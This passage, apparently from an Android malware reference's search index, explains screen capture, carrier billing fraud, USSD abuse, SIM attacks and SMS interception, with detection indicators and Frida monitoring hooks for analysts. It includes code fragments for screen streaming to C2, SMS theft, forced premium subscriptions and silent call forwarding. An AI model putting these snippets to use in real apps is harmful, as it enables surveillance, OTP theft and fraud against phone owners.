primary screen recording mechanism since Android 5.0. The <code>android.media.projection.MediaProjection</code> class creates a virtual display that mirrors the device screen. The attacker obtains a <code>MediaProjection</code> token through <code>MediaProjectionManager.createScreenCaptureIntent()</code>, which triggers a system consent dialog.</p> MediaProjection Setup and Virtual Display Creation <pre><code>MediaProjectionManager projectionManager =\n    (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);\nIntent captureIntent = projectionManager.createScreenCaptureIntent();\nstartActivityForResult(captureIntent, REQUEST_CODE);\n</code></pre> <p>On receiving the result:</p> <pre><code>@Override\nprotected void onActivityResult(int requestCode, int resultCode, Intent data) {\n    MediaProjection projection = projectionManager.getMediaProjection(resultCode, data);\n    VirtualDisplay display = projection.createVirtualDisplay(\n        \"capture\",\n        screenWidth, screenHeight, screenDensity,\n        DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,\n        surface, null, null\n    );\n}\n</code></pre> <p>The <code>Surface</code> target can be an <code>ImageReader</code> for screenshots, a <code>MediaRecorder</code> for video files, or a <code>MediaCodec</code> encoder feeding frames to a network socket for live streaming.</p> <p>Malware typically wraps this in a foreground service to maintain the projection while backgrounded. The encoded frames (H.264 or MJPEG) stream to C2 over WebSocket or a custom TCP protocol.</p>"},{"location":"attacks/screen-capture/#accessibility-based-screen-reading","title":"Accessibility-Based Screen Reading","text":"<p>An alternative that requires no MediaProjection consent. The accessibility service traverses the <code>AccessibilityNodeInfo</code> tree to extract all visible text from the current screen.</p> Accessibility Tree Traversal for Screen Reading <pre><code>@Override\npublic void onAccessibilityEvent(AccessibilityEvent event) {\n    AccessibilityNodeInfo root = getRootInActiveWindow();\n    if (root == null) return;\n    extractNodes(root);\n}\n\nprivate void extractNodes(AccessibilityNodeInfo node) {\n    if (node.getText() != null) {\n        sendToC2(node.getClassName().toString(), node.getText().toString());\n    }\n    for (int i = 0; i &lt; node.getChildCount(); i++) {\n        AccessibilityNodeInfo child = node.getChild(i);\n        if (child != null) {\n            extractNodes(child);\n            child.recycle();\n        }\n    }\n    node.recycle();\n}\n</code></pre> <p>This captures text content but not visual layout, images, or rendered WebView content. For banking trojans targeting specific fields, it is often sufficient -- account balances, transaction details, and form field values are all accessible as text nodes.</p>"},{"location":"attacks/screen-capture/#vnc-remote-access","title":"VNC / Remote Access","text":"<p>Several banking trojan families implement full VNC-like remote access by combining screen capture with input injection. The attacker views the victim's screen in real time and sends touch/gesture commands back to the device.</p> Component Implementation Screen capture MediaProjection frames encoded as H.264/VP8 Input injection Accessibility <code>dispatchGesture()</code> or <code>performAction()</code> Protocol Custom binary over WebSocket, or adapted VNC RFB protocol Latency Typically 200-500ms round trip <p>This gives the attacker full interactive control of the device, enabling manual fraud operations where the attacker logs into the banking app, navigates menus, and initiates transfers while watching the screen.</p>"},{"location":"attacks/screen-capture/#screen-streaming-to-c2","title":"Screen Streaming to C2","text":"<p>The real-time streaming pipeline used by most families:</p> <ol> <li>MediaProjection or <code>ImageReader</code> captures frames</li> <li>Frames encoded via <code>MediaCodec</code> (hardware H.264) or downscaled to JPEG</li> <li>Encoded data pushed over WebSocket or raw TCP to C2</li> <li>C2 panel renders the stream, optionally with touch input relay</li> </ol> <p>Frame rate is typically throttled to 1-5 FPS to reduce bandwidth. Some families (Octo, Vultur) use adaptive quality -- higher FPS during active interaction, dropping to periodic screenshots when the screen is idle.</p>"},{"location":"attacks/screen-capture/#flag_secure-bypass-attempts","title":"FLAG_SECURE Bypass Attempts","text":"<p>Apps can set <code>FLAG_SECURE</code> on their windows to prevent screenshots and screen recording. When active, MediaProjection captures black frames for that window.</p> Bypass Method How It Works Effectiveness Accessibility tree reading Ignores FLAG_SECURE entirely since it reads node text, not pixels Full bypass for text content Root + framebuffer access Reads <code>/dev/graphics/fb0</code> directly Requires root, works on older kernels Root + SurfaceFlinger <code>screencap</code> via <code>adb shell</code> with elevated privileges Requires root Xposed/LSPosed hooks Hook <code>Window.setFlags()</code> to strip FLAG_SECURE Requires Xposed framework Virtual display tricks Some older Android versions didn't enforce FLAG_SECURE on virtual displays Patched in Android 12+ <p>Most malware relies on accessibility tree reading as the FLAG_SECURE bypass since it requires no root and works across all Android versions. The pixel-level bypasses are limited to rooted devices or exploit chains.</p>"},{"location":"attacks/screen-capture/#android-mitigations","title":"Android Mitigations","text":"Version Change Impact on Malware Android 5.0 MediaProjection API introduced Screen recording possible without root Android 5.0-9 Consent dialog, no ongoing indicator Malware shows dialog once, records indefinitely Android 10 <code>FOREGROUND_SERVICE_MEDIA_PROJECTION</code> type required Must declare foreground service type in manifest Android 10 Persistent notification required for media projection User sees ongoing notification (malware disguises it) Android 11 MediaProjection token no longer reusable across app restarts Must re-trigger consent after process death Android 12 StatusBar indicator for active screen sharing User may notice colored dot indicator Android 14 Consent dialog shown before each capture session Breaks single-consent-then-record-forever pattern Android 14 <code>onCapturedContentVisibilityChanged()</code> callback Apps can detect when they are being captured Android 15 Screenshot detection API (<code>Activity.ScreenCaptureCallback</code>) Target apps can respond to capture events <p>Android Version Trend</p> <p>Each version makes MediaProjection harder to abuse silently. This pushes malware toward accessibility-based screen reading, which remains unaffected by these mitigations.</p>"},{"location":"attacks/screen-capture/#families-using-this-technique","title":"Families Using This Technique","text":"Family Method Details Hook VNC via accessibility Full remote access with touch relay, streams accessibility tree state to attacker panel Octo MediaProjection + accessibility Live screen streaming at adaptive FPS, combined with accessibility for input injection BRATA MediaProjection recording Records screen to local storage, exfiltrates video files to C2 SpyNote MediaProjection live stream Real-time screen sharing with bidirectional control, RAT-style remote access Vultur MediaProjection via AlphaVNC/ngrok Screen recording streamed through ngrok tunnels, later versions switched to custom protocol TrickMo Accessibility screen capture Captures screen content via accessibility tree traversal, targets banking app fields Medusa MediaProjection + VNC Live streaming with remote control capabilities BingoMod VNC via MediaProjection Screen-based VNC for on-device fraud Brokewell MediaProjection streaming Real-time screen mirroring to attacker Gigabud MediaProjection Screen recording triggered via accessibility, avoids overlay attacks entirely"},{"location":"attacks/screen-capture/#detection-during-analysis","title":"Detection During Analysis","text":"Static Indicators <ul> <li><code>FOREGROUND_SERVICE_MEDIA_PROJECTION</code> in <code>AndroidManifest.xml</code></li> <li><code>MediaProjectionManager</code> or <code>createScreenCaptureIntent</code> in decompiled code</li> <li><code>VirtualDisplay</code>, <code>ImageReader</code>, or <code>MediaCodec</code> usage</li> <li><code>AccessibilityNodeInfo</code> tree traversal with data exfiltration</li> <li>WebSocket or raw socket connections combined with media encoding classes</li> </ul> Frida: Hook MediaProjection Creation <pre><code>Java.perform(function() {\n    var MediaProjectionManager = Java.use(\"android.media.projection.MediaProjectionManager\");\n    MediaProjectionManager.createScreenCaptureIntent.implementation = function() {\n        console.log(\"[*] MediaProjection capture intent created\");\n        console.log(Java.use(\"android.util.Log\").getStackTraceString(\n            Java.use(\"java.lang.Exception\").$new()\n        ));\n        return this.createScreenCaptureIntent();\n    };\n\n    var MediaProjection = Java.use(\"android.media.projection.MediaProjection\");\n    MediaProjection.createVirtualDisplay.overload(\n        \"java.lang.String\", \"int\", \"int\", \"int\", \"int\",\n        \"android.view.Surface\", \"android.hardware.display.VirtualDisplay$Callback\",\n        \"android.os.Handler\"\n    ).implementation = function(name, w, h, dpi, flags, surface, cb, handler) {\n        console.log(\"[*] VirtualDisplay created: \" + name + \" (\" + w + \"x\" + h + \")\");\n        return this.createVirtualDisplay(name, w, h, dpi, flags, surface, cb, handler);\n    };\n});\n</code></pre> Frida: Monitor Accessibility Tree Traversal <pre><code>Java.perform(function() {\n    var AccessibilityNodeInfo = Java.use(\"android.view.accessibility.AccessibilityNodeInfo\");\n    AccessibilityNodeInfo.getText.implementation = function() {\n        var text = this.getText();\n        if (text != null) {\n            console.log(\"[*] AccessibilityNodeInfo.getText(): \" + text.toString());\n        }\n        return text;\n    };\n});\n</code></pre> Dynamic Indicators <ul> <li>Foreground service notification appearing after accessibility enablement</li> <li>High CPU usage from <code>MediaCodec</code> encoding</li> <li>Sustained outbound data stream (WebSocket or TCP) with consistent bandwidth</li> <li><code>VirtualDisplay</code> instance visible in <code>dumpsys display</code></li> <li>Accessibility service with <code>flagRetrieveInteractiveWindows</code> and <code>flagRequestFilterKeyEvents</code></li> </ul>"},{"location":"attacks/screen-capture/#relationship-to-other-techniques","title":"Relationship to Other Techniques","text":"<p>Screen capture is often combined with other attack techniques:</p> <ul> <li>Accessibility abuse provides the input injection needed for full remote access</li> <li>Overlay attacks are sometimes replaced entirely by screen capture (the attacker watches the victim use the real app)</li> <li>Keylogging captures the same credential data through input events rather than visual observation</li> </ul>"},{"location":"attacks/sim-carrier-attacks/","title":"SIM &amp; Carrier-Level Attacks","text":"<p>Exploiting the cellular infrastructure layer -- SIM cards, carrier billing systems, USSD codes, and baseband processors -- to steal money, intercept communications, and bypass authentication. Many of these attacks operate below the Android OS, making them invisible to on-device security tools. When combined with on-device malware, they form a complete attack chain: the malware handles credential theft while carrier-level manipulation defeats 2FA and enables silent monetization.</p> <p>See also: SMS Interception, Call Interception, Phishing Techniques</p> <p>Requirements</p> Requirement Details On-device (carrier billing) <code>SEND_SMS</code>, <code>RECEIVE_SMS</code>, <code>RECEIVE_WAP_PUSH</code>, <code>CHANGE_WIFI_STATE</code>, <code>INTERNET</code> On-device (USSD) <code>CALL_PHONE</code> SIM-level (Simjacker, WIBattack) No Android permissions required -- attack targets the SIM card directly via specially crafted SMS SIM swapping No device access needed -- social engineering of carrier employees eSIM manipulation <code>WRITE_EMBEDDED_SUBSCRIPTIONS</code> (carrier/system only)"},{"location":"attacks/sim-carrier-attacks/#sim-swapping","title":"SIM Swapping","text":"<p>SIM swapping is not an on-device attack, but it is the single most relevant carrier-level threat to Android security because it defeats SMS-based 2FA entirely. The attacker convinces a carrier employee (via social engineering, bribery, or insider access) to port the victim's phone number to a SIM card the attacker controls. All incoming calls and SMS messages -- including OTP codes -- now route to the attacker.</p>"},{"location":"attacks/sim-carrier-attacks/#how-it-works","title":"How It Works","text":"<ol> <li>Attacker identifies the target and gathers personal information (name, phone number, SSN, account PIN) through phishing, data breaches, or OSINT</li> <li>Attacker contacts the carrier's support (in person, by phone, or via online portal) posing as the victim</li> <li>Carrier employee processes the number transfer to a new SIM</li> <li>Victim's phone loses cellular service immediately</li> <li>Attacker receives all SMS and calls, including 2FA codes</li> <li>Attacker uses stolen credentials + intercepted OTP to drain bank accounts, take over email, and reset passwords</li> </ol>"},{"location":"attacks/sim-carrier-attacks/#impact-on-android","title":"Impact on Android","text":"<p>Once the number is ported, every SMS-based authentication mechanism fails. Banking apps that send OTP via SMS, password reset flows that use SMS verification, and any app relying on phone number as identity (WhatsApp, Telegram, Signal registration) are all compromised. The victim's device shows \"No Service\" or \"Emergency calls only,\" but many victims attribute this to network issues and do not react immediately.</p>"},{"location":"attacks/sim-carrier-attacks/#scale-and-notable-cases","title":"Scale and Notable Cases","text":"<p>The FBI IC3 reported $68 million in SIM swap losses in 2021 across 1,611 complaints, up from $12 million the year before. Real-world cases include:</p> Case Year Details Jack Dorsey (Twitter CEO) 2019 Phone number hijacked, attacker posted from his Twitter account via SMS-to-tweet Michael Terpin 2018 $23.8 million in crypto stolen; sued AT&amp;T for $200M European arrest (Europol) 2021 10 arrests across 8 countries, $100M+ in crypto stolen FCC rulemaking 2023 New rules requiring carriers to authenticate identity before processing SIM changes"},{"location":"attacks/sim-carrier-attacks/#relationship-to-android-malware","title":"Relationship to Android Malware","text":"<p>Banking trojans combine SIM swapping with on-device attacks for maximum effectiveness. The malware steals credentials via overlay attacks or keylogging, while a collaborating SIM swapper intercepts the OTP. This two-pronged approach defeats both on-device and network-based security. Some operations run as organized crime groups where separate teams handle the malware and the SIM swaps.</p>"},{"location":"attacks/sim-carrier-attacks/#esim-profile-manipulation","title":"eSIM Profile Manipulation","text":"<p>Embedded SIMs (eSIMs) introduce a software-defined attack surface. Instead of a physical SIM card, eSIM profiles are downloaded and activated programmatically. Android exposes the <code>EuiccManager</code> API for eSIM management.</p>"},{"location":"attacks/sim-carrier-attacks/#api-surface","title":"API Surface","text":"<pre><code>EuiccManager em = (EuiccManager) getSystemService(EUICC_SERVICE);\nem.downloadSubscription(\n    DownloadableSubscription.forActivationCode(\"LPA:1$smdp.example.com$ACTIVATION_CODE\"),\n    true,\n    PendingIntent.getBroadcast(this, 0, new Intent(\"DOWNLOAD_COMPLETE\"), 0)\n);\n</code></pre> <p>The <code>WRITE_EMBEDDED_SUBSCRIPTIONS</code> permission is required, and it is restricted to carrier apps and system-privileged apps. Regular third-party apps cannot call this API. This makes direct eSIM manipulation from malware extremely difficult on stock Android.</p>"},{"location":"attacks/sim-carrier-attacks/#attack-vectors","title":"Attack Vectors","text":"Vector Feasibility Description Carrier-level social engineering High Same as physical SIM swapping -- attacker convinces carrier to provision a new eSIM profile QR code phishing Medium Tricking victim into scanning an eSIM activation QR code that provisions the attacker's profile, effectively porting the number Compromised carrier app Low Exploiting a vulnerability in a carrier's privileged eSIM management app System-level exploit Very low Gaining system privileges to call <code>EuiccManager</code> directly <p>eSIM QR code phishing is the most practical on-device vector. The attacker sends a phishing message claiming the victim needs to \"update\" or \"reactivate\" their SIM by scanning a QR code. The QR encodes an eSIM activation string that provisions a profile controlled by the attacker, effectively executing a SIM swap without contacting the carrier.</p>"},{"location":"attacks/sim-carrier-attacks/#known-research","title":"Known Research","text":"<p>Researchers at Kigen have documented vulnerabilities in eUICC implementations, including issues with profile provisioning authentication and insufficient validation of SM-DP+ server certificates. The overall risk remains low for on-device exploitation because the API restrictions are sound, but carrier-side eSIM provisioning processes are subject to the same social engineering risks as traditional SIM swaps.</p>"},{"location":"attacks/sim-carrier-attacks/#carrier-billing-fraud","title":"Carrier Billing Fraud","text":"<p>The most financially impactful carrier-level attack category for Android malware. Carrier billing lets subscribers charge purchases to their phone bill without a credit card. Malware exploits this by silently subscribing victims to premium services.</p>"},{"location":"attacks/sim-carrier-attacks/#wap-billing-fraud","title":"WAP Billing Fraud","text":"<p>Wireless Application Protocol (WAP) billing allows one-click purchases on mobile data connections. The carrier identifies the subscriber by their IP address on the cellular network, so no additional authentication is required beyond being connected via mobile data.</p> <p>Attack flow:</p> <ol> <li>Malware disables WiFi to force mobile data connection (subscriber identity tied to cellular IP)</li> <li>Navigates to a WAP billing page (HTTP request over mobile data)</li> <li>Carrier injects subscriber identity headers into the HTTP request</li> <li>Malware auto-clicks the \"Subscribe\" button (via WebView JavaScript injection or accessibility)</li> <li>Confirmation SMS arrives from the carrier</li> <li>Malware intercepts and deletes the confirmation SMS before the user sees it</li> <li>Victim is charged recurring fees on their phone bill</li> </ol> <pre><code>WifiManager wm = (WifiManager) getSystemService(WIFI_SERVICE);\nwm.setWifiEnabled(false);\n\nWebView wv = new WebView(this);\nwv.getSettings().setJavaScriptEnabled(true);\nwv.loadUrl(\"http://premium-service.example/subscribe\");\nwv.setWebViewClient(new WebViewClient() {\n    @Override\n    public void onPageFinished(WebView view, String url) {\n        view.evaluateJavascript(\n            \"document.querySelector('.subscribe-btn').click();\", null);\n    }\n});\n</code></pre>"},{"location":"attacks/sim-carrier-attacks/#joker-the-king-of-wap-billing-fraud","title":"Joker: The King of WAP Billing Fraud","text":"<p>Joker (also known as Bread) is the most prolific carrier billing fraud family ever observed. Google's own analysis documented it as one of the most persistent threats to the Play Store, with over 1,700 infected apps removed since 2017. Joker's techniques evolved continuously to evade detection:</p> Era Technique Evasion 2017 Premium SMS to hardcoded short codes Basic obfuscation 2018 WAP billing with WebView automation Encrypted C2, delayed payload 2019 Dynamic code loading from C2 Payload not in APK at scan time 2020+ Native code (NDK) for billing logic Harder to decompile than DEX 2021+ Flutter/React Native wrappers Framework-specific analysis needed <p>Joker subscribed victims to premium services costing $5-$15/week per subscription, often stacking multiple subscriptions per device.</p>"},{"location":"attacks/sim-carrier-attacks/#grifthorse","title":"GriftHorse","text":"<p>GriftHorse, documented by Zimperium in September 2021, infected over 10 million devices across 70+ countries through 200+ trojanized Play Store apps. Unlike Joker's automated approach, GriftHorse used a localized social engineering flow: after installation, it bombarded the user with fake \"prize winner\" notifications. Tapping the notification loaded a geo-targeted WAP billing page in a WebView. Victims were charged approximately $35/month in recurring premium service fees, totaling over $35 million stolen.</p>"},{"location":"attacks/sim-carrier-attacks/#harly","title":"Harly","text":"<p>Harly, reported by Kaspersky in 2022, operated similarly to Joker but focused on Direct Carrier Billing (DCB). It subscribed victims to paid services by completing the entire subscription flow programmatically: opening an invisible WebView, filling in the victim's phone number, and entering the confirmation code intercepted from the carrier's verification SMS.</p>"},{"location":"attacks/sim-carrier-attacks/#premium-sms-fraud","title":"Premium SMS Fraud","text":"<p>The original carrier billing attack. Malware sends SMS messages to premium-rate short codes (numbers that charge per received message). Each SMS costs the victim $1-$10, charged directly to their phone bill.</p> <pre><code>SmsManager sm = SmsManager.getDefault();\nsm.sendTextMessage(\"7890\", null, \"SUBSCRIBE\", null, null);\n</code></pre> <p>The subscription flow requires intercepting the carrier's confirmation SMS and replying to complete the opt-in. Modern carriers flag premium SMS traffic more aggressively, but the technique still works in regions with weaker carrier-side fraud detection. See SMS Interception -- Premium SMS Fraud for the detailed flow.</p>"},{"location":"attacks/sim-carrier-attacks/#microsofts-toll-fraud-taxonomy","title":"Microsoft's Toll Fraud Taxonomy","text":"<p>Microsoft documented the toll fraud ecosystem in June 2022, classifying it as the most prevalent category of Android malware on the Play Store. Their analysis broke down the standard toll fraud kill chain: disable WiFi, load WAP billing page over cellular, auto-subscribe, intercept confirmation SMS. They noted that toll fraud malware specifically targets Android 9.0 and below because <code>WifiManager.setWifiEnabled()</code> was deprecated in Android 10 and requires <code>CHANGE_WIFI_STATE</code> plus location permissions on newer versions.</p>"},{"location":"attacks/sim-carrier-attacks/#ussd-code-exploitation","title":"USSD Code Exploitation","text":"<p>Unstructured Supplementary Service Data (USSD) codes are carrier-level commands dialed like phone numbers. They interact directly with the carrier's Home Location Register (HLR) to query account information, activate services, and modify call routing. Malware with <code>CALL_PHONE</code> permission can dial USSD codes programmatically without user interaction.</p>"},{"location":"attacks/sim-carrier-attacks/#commonly-exploited-ussd-codes","title":"Commonly Exploited USSD Codes","text":"Code Function Malware Use <code>*21*[number]#</code> Enable unconditional call forwarding Redirect all calls to attacker number <code>*67*[number]#</code> Forward when busy Selective call interception <code>*61*[number]#</code> Forward when unanswered Intercept missed calls <code>*62*[number]#</code> Forward when unreachable Capture calls when victim has no signal <code>##21#</code> Disable call forwarding Cleanup after operation <code>*#06#</code> Display IMEI Device fingerprinting <code>*123#</code> / <code>*100#</code> Balance check (carrier-specific) Recon for airtime theft <code>*141*[number]*[amount]#</code> Airtime transfer (carrier-specific) Direct financial theft in prepaid markets"},{"location":"attacks/sim-carrier-attacks/#programmatic-ussd-dialing","title":"Programmatic USSD Dialing","text":"<pre><code>Intent ussd = new Intent(Intent.ACTION_CALL);\nussd.setData(Uri.parse(\"tel:\" + Uri.encode(\"*21*+1234567890#\")));\nstartActivity(ussd);\n</code></pre> <p>On Android 8.0+, the <code>TelephonyManager.sendUssdRequest()</code> API provides a cleaner interface with a callback:</p> <pre><code>TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);\ntm.sendUssdRequest(\"*21*+1234567890#\",\n    new TelephonyManager.UssdResponseCallback() {\n        @Override\n        public void onReceiveUssdResponse(TelephonyManager tm, String req, CharSequence resp) {\n            exfiltrate(resp.toString());\n        }\n\n        @Override\n        public void onReceiveUssdResponseFailed(TelephonyManager tm, String req, int failCode) {}\n    },\n    new Handler(Looper.getMainLooper())\n);\n</code></pre>"},{"location":"attacks/sim-carrier-attacks/#fakecallfakecalls-ussd-abuse","title":"FakeCall/FakeCalls USSD Abuse","text":"<p>FakeCall (Korean banking trojan) uses USSD codes to set up call forwarding to attacker-controlled numbers. After the victim grants <code>CALL_PHONE</code> permission, FakeCall silently dials <code>*21*[attacker_number]#</code> to redirect all incoming calls. When the bank calls the victim for fraud verification, the call goes to the attacker instead. See Call Interception -- USSD Code Forwarding for the full technique breakdown.</p>"},{"location":"attacks/sim-carrier-attacks/#samsung-ussd-vulnerability-cve-2012-4001","title":"Samsung USSD Vulnerability (CVE-2012-4001)","text":"<p>In 2012, Ravi Borgaonkar demonstrated that Samsung devices would execute USSD codes embedded in <code>tel:</code> URIs without user confirmation. Visiting a webpage containing <code>&lt;iframe src=\"tel:*2767*3855#\"&gt;</code> triggered a factory reset on vulnerable Samsung Galaxy S III devices. The USSD code <code>*2767*3855#</code> is Samsung's factory reset code. The attack worked via:</p> <ul> <li>NFC tags with <code>tel:</code> URI payloads</li> <li>QR codes resolving to <code>tel:</code> URIs</li> <li>Web pages with <code>tel:</code> URI iframes or redirects</li> <li>SMS messages containing clickable <code>tel:</code> links</li> </ul> <p>Samsung patched this, and modern Android versions display a confirmation dialog before dialing USSD codes via <code>tel:</code> URIs. The incident demonstrated why programmatic USSD execution without user consent is dangerous.</p>"},{"location":"attacks/sim-carrier-attacks/#android-mitigations","title":"Android Mitigations","text":"Version Mitigation Pre-4.2 No confirmation required for <code>tel:</code> URI USSD codes 4.2+ <code>tel:</code> URI USSD codes show a confirmation dialog instead of executing directly 8.0+ <code>sendUssdRequest()</code> API added with proper permission checks 10+ Background activity launch restrictions limit silent USSD dialing"},{"location":"attacks/sim-carrier-attacks/#sim-toolkit-stk-attacks","title":"SIM Toolkit (STK) Attacks","text":"<p>SIM Toolkit is a set of commands built into the SIM card itself. STK applications are Java Card applets running on the SIM's microprocessor, entirely separate from Android. The SIM can instruct the phone to send SMS, initiate calls, launch browsers, and display menus -- all without the Android OS having a say.</p>"},{"location":"attacks/sim-carrier-attacks/#simjacker-2019","title":"Simjacker (2019)","text":"<p>Simjacker, discovered by AdaptiveMobile Security in September 2019, is the most significant SIM-level attack ever disclosed. It exploits S@T Browser (SIMalliance Toolbox Browser), a legacy application present on SIM cards from virtually every manufacturer.</p> <p>Attack flow:</p> <ol> <li>Attacker sends a specially crafted binary SMS (SMS-PP) to the target</li> <li>The SMS is routed directly to the SIM card's S@T Browser, not to Android</li> <li>S@T Browser executes STK commands embedded in the SMS payload</li> <li>Commands can: retrieve location (Cell ID), retrieve IMEI, send SMS, initiate calls, launch browser</li> <li>Results are sent back to the attacker via SMS from the SIM card</li> <li>The entire attack is invisible to the Android OS -- no notifications, no logs</li> </ol> <p>Scale: AdaptiveMobile estimated over 1 billion SIM cards across 30+ countries were vulnerable. The attack was actively exploited in the wild by a surveillance company working with government clients. Specific targets received hundreds of Simjacker attacks per week over a period of years.</p> <p>STK commands used by Simjacker:</p> STK Command Function PROVIDE LOCAL INFORMATION Get Cell ID (location), IMEI, battery status SEND SHORT MESSAGE Send SMS from victim's SIM to any number SET UP CALL Initiate voice calls OPEN CHANNEL Establish data connections SEND DTMF Send DTMF tones during active calls RUN AT COMMAND Execute AT commands on the baseband modem"},{"location":"attacks/sim-carrier-attacks/#wibattack","title":"WIBattack","text":"<p>WIBattack, disclosed by Ginno Security Lab shortly after Simjacker, targets the Wireless Internet Browser (WIB) -- another SIM-resident application similar to S@T Browser. The attack mechanism is identical: a crafted binary SMS triggers STK commands on the SIM. WIB is maintained by SmartTrust (now Giesecke+Devrient) and is present on SIM cards from different carriers than those running S@T Browser.</p>"},{"location":"attacks/sim-carrier-attacks/#why-stk-attacks-bypass-android","title":"Why STK Attacks Bypass Android","text":"<p>STK attacks operate at the SIM card layer, below the Android operating system:</p> <ul> <li>The SIM card has its own processor and runs its own Java Card OS</li> <li>Binary SMS (SMS-PP) messages are routed directly to the SIM card by the baseband modem</li> <li>Android never sees the attack SMS or the SIM's response</li> <li>No Android permission, security tool, or antivirus can detect or prevent the attack</li> <li>The SIM card can instruct the phone to perform actions (send SMS, make calls) through the baseband, bypassing Android's permission model</li> </ul> <p>Mitigation is entirely on the carrier side: updating SIM card firmware to remove or restrict S@T Browser and WIB, or deploying network-level SMS filtering to block malformed SMS-PP messages.</p>"},{"location":"attacks/sim-carrier-attacks/#basebandmodem-attacks","title":"Baseband/Modem Attacks","text":"<p>The baseband processor handles all cellular communication (2G/3G/4G/5G) and is directly connected to the SIM card interface. Vulnerabilities in the baseband firmware enable remote code execution via crafted cellular signals, potentially compromising the device before Android even processes the data.</p>"},{"location":"attacks/sim-carrier-attacks/#samsung-exynos-baseband-project-zero-2023","title":"Samsung Exynos Baseband (Project Zero, 2023)","text":"<p>Google Project Zero disclosed 18 vulnerabilities in Samsung Exynos modems in March 2023. Four were rated critical -- allowing Internet-to-baseband remote code execution with no user interaction. An attacker only needed the victim's phone number. Affected chipsets powered Samsung Galaxy S22, Pixel 6/7, and various Vivo devices. Samsung delayed patches, leading Project Zero to publicly disclose the bugs after 90 days.</p> <p>These baseband vulnerabilities are relevant to SIM/carrier attacks because:</p> <ul> <li>The baseband is the gateway between the cellular network and the SIM card</li> <li>Baseband compromise gives full access to all cellular communications</li> <li>An attacker with baseband control can intercept all calls, SMS, and data before encryption</li> <li>STK commands pass through the baseband, so a compromised baseband can inject or modify them</li> </ul> <p>Baseband exploitation is covered in more depth in the context of privilege escalation and zero-click attacks. The key point for this page is that the baseband/SIM/carrier stack forms a single attack surface that operates independently of the Android OS.</p>"},{"location":"attacks/sim-carrier-attacks/#families-using-these-techniques","title":"Families Using These Techniques","text":"Family Technique Target Revenue/Impact Joker WAP billing, premium SMS Global, Play Store 1,700+ malicious apps removed GriftHorse WAP billing via social engineering 70+ countries 10M+ victims, $35M+ stolen Harly DCB subscription fraud Global, Play Store Premium service subscriptions FakeCall USSD call forwarding South Korean banks Banking fraud via call redirection FluBot Premium SMS, SMS worm Europe Millions of SMS/day at peak MoqHao Premium SMS, smishing Japan, South Korea SMS-based propagation Rafel RAT USSD code execution, SMS fraud Global Airtime theft, account manipulation TrickMo SMS OTP interception (SIM swap assist) European banks Combined with credential theft Simjacker (surveillance tool) STK command execution via S@T Browser 30+ countries State-sponsored surveillance WIBattack (research) STK command execution via WIB Carrier-dependent Demonstrated, real-world use unknown"},{"location":"attacks/sim-carrier-attacks/#detection-challenges","title":"Detection Challenges","text":"<p>These attacks are difficult to detect because many of them operate outside the Android OS entirely.</p> Attack Visibility to Android Detection Method SIM swapping None (carrier-side) Loss of cellular signal; carrier notification (post-2023 FCC rules) eSIM social engineering None (carrier-side) Loss of cellular signal WAP billing fraud Partial (WebView, WiFi toggle, SMS) Monitor for WiFi disable + WebView + SMS intercept pattern Premium SMS Full (uses <code>SEND_SMS</code> API) Standard permission analysis and behavioral monitoring USSD dialing Full (uses <code>CALL_PHONE</code> API) Monitor for <code>tel:</code> intents with USSD code patterns Simjacker/WIBattack None (SIM-level) Only detectable at carrier network level via SMS-PP inspection Baseband exploitation None (below OS) Only detectable via baseband firmware analysis or network anomaly detection Static Indicators <ul> <li><code>WifiManager.setWifiEnabled(false)</code> combined with WebView creation (WAP billing pattern)</li> <li><code>RECEIVE_WAP_PUSH</code> permission in manifest</li> <li>Premium short code numbers in strings or resources</li> <li>USSD code patterns (<code>*21*</code>, <code>*67*</code>, <code>*#06#</code>, <code>*123#</code>) in strings or encoded resources</li> <li><code>ACTION_CALL</code> intents with <code>tel:</code> URIs containing <code>#</code> or <code>*</code></li> <li><code>TelephonyManager.sendUssdRequest()</code> calls</li> <li><code>EuiccManager</code> API references (rare but notable)</li> <li>JavaScript injection strings targeting subscription buttons (<code>querySelector('.subscribe')</code>)</li> </ul> Dynamic Indicators <ul> <li>WiFi disabled immediately followed by HTTP requests over mobile data</li> <li>WebView loading known WAP billing domains</li> <li>SMS sent to premium short codes</li> <li>SMS received from carrier billing services, immediately deleted</li> <li><code>ACTION_CALL</code> intents with USSD code payloads</li> <li>Outbound SMS the user did not initiate</li> <li>Sudden loss of cellular connectivity (potential SIM swap in progress)</li> </ul>"},{"location":"attacks/sms-interception/","title":"SMS Interception &amp; Theft","text":"<p>Intercepting, reading, sending, and forwarding SMS messages for OTP theft, premium fraud, worm propagation, and command-and-control. SMS interception was the original 2FA bypass technique in Android banking malware and remains relevant despite Android's progressive restrictions, because many financial institutions still rely on SMS-based authentication.</p> <p>See also: Notification Suppression, Call Interception, Notification Listener Abuse</p> <p>Requirements</p> Requirement Details Permission <code>RECEIVE_SMS</code>, <code>READ_SMS</code>, <code>SEND_SMS</code> -- varies by technique Play Store Restricted since January 2019. Only default SMS apps and approved use cases. Distribution Most SMS-abusing malware distributes via sideloading, smishing links, or third-party stores"},{"location":"attacks/sms-interception/#attack-techniques","title":"Attack Techniques","text":""},{"location":"attacks/sms-interception/#broadcast-interception","title":"Broadcast Interception","text":"<p>The <code>SMS_RECEIVED</code> broadcast is ordered, meaning receivers execute by priority. Malware registers a high-priority receiver to process the SMS before any other app:</p> <pre><code>&lt;receiver android:name=\".SmsReceiver\" android:exported=\"true\"&gt;\n    &lt;intent-filter android:priority=\"999\"&gt;\n        &lt;action android:name=\"android.provider.Telephony.SMS_RECEIVED\" /&gt;\n    &lt;/intent-filter&gt;\n&lt;/receiver&gt;\n</code></pre> High-Priority SMS Broadcast Receiver with Exfiltration <pre><code>public class SmsReceiver extends BroadcastReceiver {\n    @Override\n    public void onReceive(Context context, Intent intent) {\n        SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(intent);\n        for (SmsMessage msg : msgs) {\n            String sender = msg.getOriginatingAddress();\n            String body = msg.getMessageBody();\n            exfiltrate(sender, body);\n        }\n        abortBroadcast();\n    }\n}\n</code></pre> <p><code>abortBroadcast()</code> prevents the default SMS app from receiving the message -- the user never sees it. On Android 4.4+, only the default SMS app can successfully abort the broadcast, but the malware still receives and reads the content.</p>"},{"location":"attacks/sms-interception/#contentresolver-sms-query","title":"ContentResolver SMS Query","text":"<p>Reading stored SMS messages from the system content provider. Does not require real-time interception -- the malware queries the SMS database retroactively:</p> 